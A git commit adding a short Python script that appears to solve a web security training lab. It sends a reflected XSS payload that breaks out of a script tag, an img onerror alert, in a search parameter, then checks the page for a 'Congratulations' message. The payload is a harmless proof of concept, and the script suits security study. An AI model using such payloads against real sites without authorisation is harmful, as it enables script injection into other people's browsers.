57ef2b44794daee2a78d5cd7285267593b56796d
Mohammed Hawary <01022823818l@gmail.com>
2023-09-08 18:12:43 +0300

    08/09/2023

---
+++ XSS/Reflected_XSS_into_a_JavaScript_string_with_single_quote_and_backslash_escaped.py
@@ -0,0 +1,32 @@
+import requests
+import urllib3
+from sys import argv
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def get_website_url():
+    if len(argv) != 2:
+        print(f"[+] usage {argv[0]} <url>")
+        print(f"[+] example {argv[0]} 'http://example.com'")
+        exit(-1)
+
+    if argv[1][-1] == '/':
+        url = argv[1][:-1]
+    else:
+        url = argv[1]
+    return url
+
+def attack(url): 
+    print("[+] Starting attack")
+    xss_payload = f"</script><img src=1 onerror=alert(\"xss\")>"
+    print(f"[+] sending xss payload : {xss_payload}")
+    params = {"search":xss_payload}
+    r = requests.get(url, params=params)
+
+    r = requests.get(url)
+    if 'Congratulations' in r.text:
+        print("[+] attack successfully")
+    else:
+        print("[-] Attack un successfully")
+
+attack(get_website_url())
